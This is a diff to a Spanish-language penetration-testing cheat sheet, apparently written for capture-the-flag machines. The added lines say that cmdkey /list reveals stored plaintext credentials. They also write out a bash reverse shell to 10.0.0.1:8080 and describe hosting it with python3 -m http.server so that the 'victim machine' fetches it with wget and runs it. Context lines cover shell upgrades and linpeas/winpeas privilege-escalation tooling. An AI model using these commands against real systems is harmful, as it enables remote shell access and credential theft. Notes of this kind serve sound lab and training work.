@@ -10,7 +10,7 @@ La root.txt en windows se encuentra en /users/Administrator/Desktop
 ```
 ### WINDOWS
 ```
-cmdkey /list
+cmdkey /list ---> te lista si hay contraseñas en texto claro guardadas
 whoami /all
 wmic logicaldisk get name
 get-process
@@ -80,6 +80,7 @@ REVERSE SHELL MAS POTENTE (Se ejecuta una vez que están dentro de una reverse S
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")
 
+Se puede copiar la reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1) en un .sh por ejemplo el shell.sh y a traves de python3 -m http.server 80 lo subimos a la maquina victima y lo ejecutamos en caso de que no te funcione la reverse de primeras, en la maquina victima --> wget 10.10.14.6/shell.sh --> bash shell.sh
 ```
 ### MYSQL
 ```
@@ -172,7 +173,7 @@ TENIENDO CONTRASEÑA ---> no se pone -i peterolord --->scp ./Downloads/linpeas.s
 Una vez que ya tienes el linpeas dentro de la maquina victima te vas a /tmp y haces BASH linpeash.sh
 Si es winpeas lo corres poniendo el nombre solo
 
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR = USER KEY
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGcUHHKDpEXK5XbpXBFIoJ6Duq+2c1Y9gfoLn+BK+RhR = ''USER'' KEY
 ```
 ### PHP SHELL
 ```
